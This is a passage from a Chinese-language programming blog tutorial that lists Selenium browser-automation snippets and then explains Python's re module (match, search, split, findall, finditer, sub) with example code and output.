爬取数据</span></span><br></pre></td></tr></table></figure><h2 id="Selenium自动化测试工具使用方法汇总"><a href="#Selenium自动化测试工具使用方法汇总" class="headerlink" title="Selenium自动化测试工具使用方法汇总"></a>Selenium自动化测试工具使用方法汇总</h2><p><strong>1、设置无头浏览器模式</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;- -headless&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;- -disable-gpu&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XX</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">self.driver = webdriver.Chrome(chrome_options=chrome_options)<span class="comment"># 设置无头</span></span><br></pre></td></tr></table></figure><p><strong>2、设置屏幕尺寸</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.driver.maximize_window() <span class="comment"># 最大</span></span><br><span class="line">self.driver.get_window_size() <span class="comment"># 获取窗口尺寸</span></span><br><span class="line">self.driver.set_window_size(<span class="number">1296</span>, <span class="number">1000</span>) <span class="comment"># 指定像素 宽1296 高1000</span></span><br></pre></td></tr></table></figure><p><strong>3、通过xpath获取元素并单击</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element = self.driver.find_elements_by_xpath(<span class="string">&#x27;//*[@id=&quot;disabled&quot;]/li[3]/a&#x27;</span>) <span class="comment"># element是获取的元素列表</span></span><br><span class="line">element [<span class="number">0</span>].click()</span><br></pre></td></tr></table></figure><p><strong>4、关闭单个窗口</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭单个窗口</span></span><br><span class="line">self.driver.close()</span><br></pre></td></tr></table></figure><p><strong>5、退出driver程序，关闭浏览器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p><strong>6、获取input标签 输入文字 执行回车</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line">\<span class="comment"># 输入主机名：spupa01bat04 回车查询</span></span><br><span class="line">element = self.driver.find_elements_by_xpath(input_enter_xpath)[<span class="number">0</span>]</span><br><span class="line">element.send_keys(<span class="string">&#x27;spupa01bat04&#x27;</span>)</span><br><span class="line">element.send_keys(Keys.ENTER)</span><br></pre></td></tr></table></figure><p><strong>7、执行双击</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains <span class="comment"># 该类可执行鼠标动作：双击 拖拽等</span></span><br><span class="line">self.driver = webdriver.Chrome()</span><br><span class="line">self.acobj = ActionChains(self.driver)</span><br><span class="line">checkName = <span class="string">&#x27;风险&#x27;</span></span><br><span class="line">\<span class="comment"># &#x27;&quot; + checkName + &quot;&#x27;是向标签xpath字符串路经引入的变量</span></span><br><span class="line">Xpath = <span class="string">&quot;//span[text()=&#x27;&quot;</span> + checkName + <span class="string">&quot;&#x27;]/../../..//span[text()=&#x27;FSCapacity&#x27;]&quot;</span></span><br><span class="line">el_01 = self.driver.find_elements_by_xpath(Xpath)[<span class="number">0</span>] <span class="comment"># 获取元素</span></span><br><span class="line">self.acobj.double_click(el_01).perform() <span class="comment"># 执行双击</span></span><br><span class="line">self.driver.implicitly_wait(<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p><strong>8、执行等待</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 隐式等待:设置一个等待时间，如果在这个等待时间内，网页加载完成，则执行下一步；否则一直等待时间截止，然后再执行下一步。这样也就会有个弊端，程序会一直等待整个页面加载完成，直到超时，但有时候我需要的那个元素早就加载完成了，只是页面上有个别其他元素加载特别慢，我仍要等待页面全部加载完成才能执行下一步。</span></span><br><span class="line">self.driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 显示等待:配合该类的until()和until_not()方法，就能够根据判断条件而进行灵活地等待了。它主要的意思就是：程序每隔xx检查一次，如果条件成立了，则执行下一步，否则继续等待，直到超过设置的最长时间，然后抛出TimeoutException</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="comment"># 超时时间为30秒，每0.2秒检查1次，直到class=&quot;tt&quot;的元素出现</span></span><br><span class="line">text = WebDriverWait(driver,<span class="number">30</span>,<span class="number">0.2</span>).until(<span class="keyword">lambda</span> x:x.find_element_by_css_selector(<span class="string">&quot;.tt&quot;</span>)).text</span><br><span class="line"><span class="built_in">print</span>(text)</span><br><span class="line"><span class="comment"># 强制等待：简单粗暴效率低</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><strong>9、浏览器全屏截图保存到指定路径</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">png01_path = os.path.join(os.path.dirname(os.path.dirname(os.path.realpath(__file__))), <span class="string">&#x27;resource&#x27;</span>, <span class="string">&#x27;png_codes.png&#x27;</span>)</span><br><span class="line">self.driver.save_screenshot(png01_path)</span><br></pre></td></tr></table></figure><p><strong>10、select下拉框的选值处理</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support.select <span class="keyword">import</span> Select</span><br><span class="line"><span class="comment"># 定位下拉框对象</span></span><br><span class="line">select_element = self.driver.find_elements_by_xpath(select_xpath)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 构建下拉框对象</span></span><br><span class="line">sel_obj = Select(select_element)</span><br><span class="line"><span class="comment"># 通过value值进行选择：一周</span></span><br><span class="line">sel_obj.select_by_value(<span class="string">&#x27;168h&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>11、浏览器位置</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取浏览器位置</span></span><br><span class="line">position = driver.get_window_position()</span><br><span class="line"><span class="built_in">print</span>(position)</span><br><span class="line"><span class="comment"># 设置浏览器位置</span></span><br><span class="line">driver.set_window_position(<span class="number">100</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="正则表达式的语法规则"><a href="#正则表达式的语法规则" class="headerlink" title="正则表达式的语法规则"></a>正则表达式的语法规则</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/2015430160820157.png" alt="2015430160820157.png (799×1719)"></p><h3 id="函数API列表"><a href="#函数API列表" class="headerlink" title="函数API列表"></a>函数API列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span>(string[, pos[, endpos]]) | re.<span class="keyword">match</span>(pattern, string[, flags])</span><br><span class="line">search(string[, pos[, endpos]]) | re.search(pattern, string[, flags])</span><br><span class="line">split(string[, maxsplit]) | re.split(pattern, string[, maxsplit])</span><br><span class="line">findall(string[, pos[, endpos]]) | re.findall(pattern, string[, flags])</span><br><span class="line">finditer(string[, pos[, endpos]]) | re.finditer(pattern, string[, flags])</span><br><span class="line">sub(repl, string[, count]) | re.sub(pattern, repl, string[, count])</span><br><span class="line">subn(repl, string[, count]) |re.sub(pattern, repl, string[, count])</span><br></pre></td></tr></table></figure><h3 id="正则表达式相关注解"><a href="#正则表达式相关注解" class="headerlink" title="正则表达式相关注解"></a>正则表达式相关注解</h3><p><strong>（1）数量词的贪婪模式与非贪婪模式</strong></p><p>正则表达式通常用于在文本中查找匹配的字符串。Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字 符；非贪婪的则相反，总是尝试匹配尽可能少的字符。例如：正则表达式<code>”ab*”</code>如果用于查找<code>”abbbc”</code>，将找到<code>”abbb”</code>。而如果使用非贪婪的数量 词<code>”ab*?”</code>，将找到<code>”a”</code>。</p><p>注：我们一般使用非贪婪模式来提取。<br><strong>（2）反斜杠问题</strong></p><p>与大多数编程语言相 同，正则表达式里使用<code>”\”</code>作为转义字符，这就可能造成反斜杠困扰。假如需要匹配文本中的字符<code>”\”</code>，那么使用编程语言表示的正则表达式里将需要4个反 斜杠<code>”\\\\”</code>：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。</p><p>Python里的原生字符串很好地解决了这个问题，这个例子中的正则表达式可以使用<code>r”\\”</code>表示。同样，匹配一个数字的<code>”\\d”</code>可以写成<code>r”\d”</code>。<br><strong>4.Python Re模块</strong></p><p>Python 自带了re模块，它提供了对正则表达式的支持。主要用到的方法列举如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回pattern对象</span></span><br><span class="line">re.<span class="built_in">compile</span>(string[,flag]) </span><br><span class="line"><span class="comment">#以下为匹配所用函数</span></span><br><span class="line">re.<span class="keyword">match</span>(pattern, string[, flags])</span><br><span class="line">re.search(pattern, string[, flags])</span><br><span class="line">re.split(pattern, string[, maxsplit])</span><br><span class="line">re.findall(pattern, string[, flags])</span><br><span class="line">re.finditer(pattern, string[, flags])</span><br><span class="line">re.sub(pattern, repl, string[, count])</span><br><span class="line">re.subn(pattern, repl, string[, count])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>pattern的概念</strong><br><code>pattern</code>可以理解为一个匹配模式，获得这个匹配模式，需要利用<code>re.compile</code>方法就可以。例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;hello&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在参数中我们传入了原生字符串对象，通过<code>compile</code>方法编译生成一个<code>pattern</code>对象，然后我们利用这个对象来进行进一步的匹配。</p><p>另外大家可能注意到了另一个参数 <code>flags</code>，在这里解释一下这个参数的含义：</p><p>参数flag是匹配模式，取值可以使用按位或运算符’|’表示同时生效，比如re.I | re.M。</p><p>可选值有：</p><ul><li><code>? re.I</code>(全拼：IGNORECASE): 忽略大小写（括号内是完整写法，下同）</li><li><code>? re.M</code>(全拼：MULTILINE): 多行模式，改变<code>&#39;^&#39;</code>和<code>&#39;$&#39;</code>的行为（参见上图）</li><li><code>? re.S</code>(全拼：DOTALL): 点任意匹配模式，改变’.’的行为</li><li><code>? re.L</code>(全拼：LOCALE): 使预定字符类 <code>\w \W \b \B \s \S</code> 取决于当前区域设定</li><li><code>? re.U</code>(全拼：UNICODE): 使预定字符类<code> \w \W \b \B \s \S \d \D</code> 取决于<code>unicode</code>定义的字符属性</li><li><code>? re.X</code>(全拼：VERBOSE): 详细模式。这个模式下正则表达式可以是多行，忽略空白字符，并可以加入注释。</li></ul><p>在刚才所说的另外几个方法例如<code> re.match</code> 里我们就需要用到这个<code>pattern</code>了，下面我们一一介绍。</p><p>注：以下七个方法中的<code>flags</code>同样是代表匹配模式的意思，如果在<code>pattern</code>生成时已经指明了flags，那么在下面的方法中就不需要传入这个参数了。</p><p><strong>（1）re.match(pattern, string[, flags])</strong></p><p>这个方法将会从string（我们要匹配的字符串）的开头开始，尝试匹配pattern，一直向后匹配，如果遇到无法匹配的字符，立即返回 None，如果匹配未结束已经到达string的末尾，也会返回None。两个结果均表示匹配失败，否则匹配pattern成功，同时匹配终止，不再对 string向后匹配。下面我们通过一个例子理解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__author__ = <span class="string">&#x27;L0ki&#x27;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#导入re模块</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将正则表达式编译成Pattern对象，注意hello前面的r的意思是“原生字符串”</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;hello&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用re.match匹配文本，获得匹配结果，无法匹配时将返回None</span></span><br><span class="line">result1 = re.<span class="keyword">match</span>(pattern,<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">result2 = re.<span class="keyword">match</span>(pattern,<span class="string">&#x27;helloo  L0ki!&#x27;</span>)</span><br><span class="line">result3 = re.<span class="keyword">match</span>(pattern,<span class="string">&#x27;helo  L0ki!&#x27;</span>)</span><br><span class="line">result4 = re.<span class="keyword">match</span>(pattern,<span class="string">&#x27;hello  L0ki!&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果1匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result1:</span><br><span class="line">  <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">  <span class="built_in">print</span> result1.group()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;1匹配失败！&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果2匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">  <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">  <span class="built_in">print</span> result2.group()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;2匹配失败！&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果3匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result3:</span><br><span class="line">  <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">  <span class="built_in">print</span> result3.group()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;3匹配失败！&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果4匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result4:</span><br><span class="line">  <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">  <span class="built_in">print</span> result4.group()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;4匹配失败！&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hello``hello``<span class="number">3</span>``匹配失败！``hellohello</span><br><span class="line">hello</span><br><span class="line"><span class="number">3</span>匹配失败！</span><br><span class="line">hello</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="匹配分析"><a href="#匹配分析" class="headerlink" title="匹配分析"></a>匹配分析</h3><p>1.第一个匹配，pattern正则表达式为’hello’，我们匹配的目标字符串string也为hello，从头至尾完全匹配，匹配成功。</p><p>2.第二个匹配，string为helloo  L0ki，从string头开始匹配pattern完全可以匹配，pattern匹配结束，同时匹配终止，后面的o  L0ki不再匹配，返回匹配成功的信息。</p><p>3.第三个匹配，string为helo  L0ki，从string头开始匹配pattern，发现到 ‘o’ 时无法完成匹配，匹配终止，返回None</p><p>4.第四个匹配，同第二个匹配原理，即使遇到了空格符也不会受影响。</p><p>我们还看到最后打印出了result.group()，这个是什么意思呢？下面我们说一下关于match对象的的属性和方法<br>Match对象是一次匹配的结果，包含了很多关于此次匹配的信息，可以使用Match提供的可读属性或方法来获取这些信息。</p><p><strong>属性：</strong><br>1.string: 匹配时使用的文本。<br>2.re: 匹配时使用的Pattern对象。<br>3.pos: 文本中正则表达式开始搜索的索引。值与<code>Pattern.match()</code>和<code>Pattern.seach()</code>方法的同名参数相同。<br>4.endpos: 文本中正则表达式结束搜索的索引。值与<code>Pattern.match()</code>和<code>Pattern.seach()</code>方法的同名参数相同。<br>5.lastindex: 最后一个被捕获的分组在文本中的索引。如果没有被捕获的分组，将为None。<br>6.lastgroup: 最后一个被捕获的分组的别名。如果这个分组没有别名或者没有被捕获的分组，将为None。</p><p><strong>方法：</strong><br>1.group([group1, …]):<br>获得一个或多个分组截获的字符串；指定多个参数时将以元组形式返回。group1可以使用编号也可以使用别名；编号0代表整个匹配的子串；不填写参数时，返回group(0)；没有截获字符串的组返回None；截获了多次的组返回最后一次截获的子串。<br>2.groups([default]):<br>以元组形式返回全部分组截获的字符串。相当于调用group(1,2,…last)。default表示没有截获字符串的组以这个值替代，默认为None。<br>3.groupdict([default]):<br>返回以有别名的组的别名为键、以该组截获的子串为值的字典，没有别名的组不包含在内。default含义同上。<br>4.start([group]):<br>返回指定的组截获的子串在string中的起始索引（子串第一个字符的索引）。group默认值为0。<br>5.end([group]):<br>返回指定的组截获的子串在string中的结束索引（子串最后一个字符的索引+1）。group默认值为0。<br>6.span([group]):<br>返回(start(group), end(group))。<br>7.expand(template):<br>将匹配到的分组代入template中然后返回。template中可以使用<code>\id</code>或<code>\g</code>、<code>\g</code>引用分组，但不能使用编号0。<code>\id</code>与<code>\g</code>是等价的；但<code>\10</code>将被认为是第10个分组，如果你想表达<code>\1</code>之后是字符<code>&#39;0&#39;</code>，只能使用<code>\g0</code>。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#一个简单的match实例</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># 匹配如下内容：单词+空格+单词+任意字符</span></span><br><span class="line">m = re.<span class="keyword">match</span>(<span class="string">r&#x27;(\w+) (\w+)(?P.*)&#x27;</span>, <span class="string">&#x27;hello world!&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.string:&quot;</span>, m.string</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.re:&quot;</span>, m.re</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.pos:&quot;</span>, m.pos</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.endpos:&quot;</span>, m.endpos</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.lastindex:&quot;</span>, m.lastindex</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.lastgroup:&quot;</span>, m.lastgroup</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.group():&quot;</span>, m.group()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.group(1,2):&quot;</span>, m.group(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.groups():&quot;</span>, m.groups()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.groupdict():&quot;</span>, m.groupdict()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.start(2):&quot;</span>, m.start(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.end(2):&quot;</span>, m.end(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;m.span(2):&quot;</span>, m.span(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">r&quot;m.expand(r&#x27;\g \g\g&#x27;):&quot;</span>, m.expand(<span class="string">r&#x27;\2 \1\3&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### output ###</span></span><br><span class="line"><span class="comment"># m.string: hello world!</span></span><br><span class="line"><span class="comment"># m.re: </span></span><br><span class="line"><span class="comment"># m.pos: 0</span></span><br><span class="line"><span class="comment"># m.endpos: 12</span></span><br><span class="line"><span class="comment"># m.lastindex: 3</span></span><br><span class="line"><span class="comment"># m.lastgroup: sign</span></span><br><span class="line"><span class="comment"># m.group(1,2): (&#x27;hello&#x27;, &#x27;world&#x27;)</span></span><br><span class="line"><span class="comment"># m.groups(): (&#x27;hello&#x27;, &#x27;world&#x27;, &#x27;!&#x27;)</span></span><br><span class="line"><span class="comment"># m.groupdict(): &#123;&#x27;sign&#x27;: &#x27;!&#x27;&#125;</span></span><br><span class="line"><span class="comment"># m.start(2): 6</span></span><br><span class="line"><span class="comment"># m.end(2): 11</span></span><br><span class="line"><span class="comment"># m.span(2): (6, 11)</span></span><br><span class="line"><span class="comment"># m.expand(r&#x27;\2 \1\3&#x27;): world hello!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>（2）re.search(pattern, string[, flags])</strong></p><p>search方法与match方法极其类似，区别在于match()函数只检测re是不是在string的开始位置匹配，search()会扫描整个string查找匹配，match（）只有在0位置匹配成功的话才有返回，如果不是开始位置匹配成功的话，match()就返回None。同样，search方法的返回对象同样match()返回对象的方法和属性。我们用一个例子感受一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入re模块</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将正则表达式编译成Pattern对象</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;world&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用search()查找匹配的子串，不存在能匹配的子串时将返回None</span></span><br><span class="line"><span class="comment"># 这个例子中使用match()无法成功匹配</span></span><br><span class="line"><span class="keyword">match</span> = re.search(pattern,<span class="string">&#x27;hello world!&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">  <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">  <span class="built_in">print</span> <span class="keyword">match</span>.group()</span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># world</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>（3）re.split(pattern, string[, maxsplit])</strong></p><p>按照能够匹配的子串将string分割后返回列表。maxsplit用于指定最大分割次数，不指定将全部分割。我们通过下面的例子感受一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> re.split(pattern,<span class="string">&#x27;one1two2three3four4&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># [&#x27;one&#x27;, &#x27;two&#x27;, &#x27;three&#x27;, &#x27;four&#x27;, &#x27;&#x27;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>**（4）re.findall(pattern, string[, flags])<br>**</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">搜索string，以列表形式返回全部能匹配的子串。我们通过这个例子来感受一下</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> re.findall(pattern,<span class="string">&#x27;one1two2three3four4&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>（5）re.finditer(pattern, string[, flags])</strong></p><p>搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。我们通过下面的例子来感受一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(pattern,<span class="string">&#x27;one1two2three3four4&#x27;</span>):</span><br><span class="line">  <span class="built_in">print</span> m.group(),</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># 1 2 3 4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>（6）re.sub(pattern, repl, string[, count])</strong></p><p>使用repl替换string中每一个匹配的子串后返回替换后的字符串。<br>当repl是一个字符串时，可以使用\id或\g、\g引用分组，但不能使用编号0。<br>当repl是一个方法时，这个方法应当只接受一个参数（Match对象），并返回一个字符串用于替换（返回的字符串中不能再引用分组）。<br>count用于指定最多替换次数，不指定时全部替换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 